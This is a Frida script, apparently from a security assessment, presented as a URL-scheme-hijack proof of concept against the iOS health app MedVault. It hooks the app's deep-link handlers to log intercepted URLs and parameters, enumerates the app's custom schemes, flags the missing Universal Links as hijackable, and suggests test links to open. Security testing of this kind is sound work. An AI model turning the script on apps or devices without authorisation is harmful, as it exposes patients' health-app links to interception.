/*
 * URL Scheme Hijack PoC - Frida Script (lightweight)
 * Target: MedVault (com.novahealth.medvault)
 *
 * Usage: frida -U -n "MedVault" -l frida-url-hijack.js
 */

'use strict';

var C = {
    red: '\x1b[31m', green: '\x1b[32m', yellow: '\x1b[33m',
    cyan: '\x1b[36m', reset: '\x1b[0m', bold: '\x1b[1m',
};

function banner(msg) {
    console.log(C.red + C.bold +
        '\n╔══════════════════════════════════════════════════╗' +
        '\n║  URL SCHEME HIJACK PoC — ' + msg.padEnd(24) + '║' +
        '\n╚══════════════════════════════════════════════════╝' + C.reset);
}

function logURL(label, urlStr) {
    var nsurl = ObjC.classes.NSURL.URLWithString_(urlStr);
    var scheme = nsurl && nsurl.scheme() ? nsurl.scheme().toString() : 'N/A';
    var host   = nsurl && nsurl.host() ? nsurl.host().toString() : 'nil';
    var path   = nsurl && nsurl.path() ? nsurl.path().toString() : '/';
    var query  = nsurl && nsurl.query() ? nsurl.query().toString() : 'none';

    console.log(C.cyan + '──────────────────────────────────────────────────' + C.reset);
    console.log(C.bold + '[' + label + '] ' + new Date().toISOString() + C.reset);
    console.log(C.yellow + '  URL:    ' + C.reset + urlStr);
    console.log(C.yellow + '  Scheme: ' + C.reset + scheme);
    console.log(C.yellow + '  Host:   ' + C.reset + host);
    console.log(C.yellow + '  Path:   ' + C.reset + path);
    console.log(C.yellow + '  Query:  ' + C.reset + query);
    if (nsurl) {
        var comps = ObjC.classes.NSURLComponents.componentsWithURL_resolvingAgainstBaseURL_(nsurl, false);
        if (comps && comps.queryItems()) {
            var items = comps.queryItems();
            for (var i = 0; i < items.count(); i++) {
                var item = items.objectAtIndex_(i);
                console.log(C.green + '  Param:  ' + C.reset +
                    item.name().toString() + ' = ' + (item.value() ? item.value().toString() : 'nil'));
            }
        }
    }
    console.log(C.cyan + '──────────────────────────────────────────────────' + C.reset);
}

// ============================================================
// HOOK 1: UIApplication openURL (catch ALL incoming & outgoing)
// ============================================================
Interceptor.attach(ObjC.classes.UIApplication['- openURL:options:completionHandler:'].implementation, {
    onEnter: function(args) {
        var url = ObjC.Object(args[2]).absoluteString().toString();
        console.log(C.yellow + '[>] openURL called: ' + url + C.reset);
    }
});
console.log(C.green + '[+] Hooked UIApplication openURL:options:completionHandler:' + C.reset);

// ============================================================
// HOOK 2: Expo/RN SceneDelegate — try known Expo class names
// ============================================================
var sceneClasses = ['EXAppDelegateWrapper', 'RCTRootViewFactory'];
sceneClasses.forEach(function(name) {
    try {
        var cls = ObjC.classes[name];
        if (cls && cls['- scene:openURLContexts:']) {
            Interceptor.attach(cls['- scene:openURLContexts:'].implementation, {
                onEnter: function(args) {
                    var contexts = ObjC.Object(args[3]);
                    var enumerator = contexts.objectEnumerator();
                    var ctx;
                    while ((ctx = enumerator.nextObject()) !== null) {
                        var url = ctx.URL().absoluteString().toString();
                        banner('INTERCEPTED (warm)');
                        logURL('scene:openURLContexts: [' + name + ']', url);
                    }
                }
            });
            console.log(C.green + '[+] Hooked scene:openURLContexts: on ' + name + C.reset);
        }
    } catch (e) {}
});

// ============================================================
// HOOK 3: Expo/RN AppDelegate — application:openURL:options:
// ============================================================
var appClasses = ['EXAppDelegateWrapper', 'RCTAppDelegate'];
appClasses.forEach(function(name) {
    try {
        var cls = ObjC.classes[name];
        if (cls && cls['- application:openURL:options:']) {
            Interceptor.attach(cls['- application:openURL:options:'].implementation, {
                onEnter: function(args) {
                    var url = ObjC.Object(args[3]).absoluteString().toString();
                    banner('INTERCEPTED (app delegate)');
                    logURL('application:openURL: [' + name + ']', url);
                }
            });
            console.log(C.green + '[+] Hooked application:openURL:options: on ' + name + C.reset);
        }
    } catch (e) {}
});

// ============================================================
// HOOK 4: RCTLinkingManager — React Native bridge for URLs
// ============================================================
try {
    var RCTLinking = ObjC.classes.RCTLinkingManager;
    if (RCTLinking) {
        if (RCTLinking['- openURL:resolve:reject:']) {
            Interceptor.attach(RCTLinking['- openURL:resolve:reject:'].implementation, {
                onEnter: function(args) {
                    console.log(C.yellow + '[>] RN Linking.openURL: ' + ObjC.Object(args[2]).toString() + C.reset);
                }
            });
            console.log(C.green + '[+] Hooked RCTLinkingManager openURL:resolve:reject:' + C.reset);
        }
        if (RCTLinking['- getInitialURL:reject:']) {
            Interceptor.attach(RCTLinking['- getInitialURL:reject:'].implementation, {
                onEnter: function(args) {
                    console.log(C.cyan + '[*] RN Linking.getInitialURL() called' + C.reset);
                }
            });
            console.log(C.green + '[+] Hooked RCTLinkingManager getInitialURL:' + C.reset);
        }
    }
} catch (e) {}

// ============================================================
// HOOK 5: NSNotificationCenter — catch RCTOpenURLNotification
// ============================================================
Interceptor.attach(ObjC.classes.NSNotificationCenter['- postNotificationName:object:userInfo:'].implementation, {
    onEnter: function(args) {
        var name = ObjC.Object(args[2]).toString();
        if (name.indexOf('URL') !== -1 || name.indexOf('url') !== -1 ||
            name.indexOf('Link') !== -1 || name.indexOf('link') !== -1) {
            console.log(C.green + '[*] Notification: ' + name + C.reset);
            try {
                var info = ObjC.Object(args[4]);
                if (!info.isKindOfClass_(ObjC.classes.NSNull)) {
                    console.log(C.cyan + '    userInfo: ' + info.toString() + C.reset);
                }
            } catch (e) {}
        }
    }
});
console.log(C.green + '[+] Hooked NSNotificationCenter (URL filter)' + C.reset);

// ============================================================
// Print app info
// ============================================================
banner('HOOKS ACTIVE        ');

var bundle = ObjC.classes.NSBundle.mainBundle();
console.log(C.bold + '\nBundle ID: ' + C.reset + bundle.bundleIdentifier().toString());

console.log(C.bold + 'Registered URL schemes:' + C.reset);
var urlTypes = bundle.objectForInfoDictionaryKey_('CFBundleURLTypes');
if (urlTypes) {
    for (var i = 0; i < urlTypes.count(); i++) {
        var schemes = urlTypes.objectAtIndex_(i).objectForKey_('CFBundleURLSchemes');
        if (schemes) {
            for (var j = 0; j < schemes.count(); j++) {
                console.log(C.red + '  -> ' + schemes.objectAtIndex_(j).toString() + '://' + C.reset);
            }
        }
    }
}

var domains = bundle.objectForInfoDictionaryKey_('com.apple.developer.associated-domains');
if (domains) {
    console.log(C.green + 'Associated Domains: ' + domains.toString() + C.reset);
} else {
    console.log(C.red + C.bold + '\n[!!] NO Universal Links — app uses only custom URL schemes (hijackable)' + C.reset);
}

console.log(C.bold + '\nOpen Safari on device and type:' + C.reset);
console.log('  medvault://prepped/dashboard');
console.log('  medvault://prepped/symptoms/symptom_reporting?existingSymptomRecordId=1337');
console.log(C.bold + '\nWaiting...\n' + C.reset);
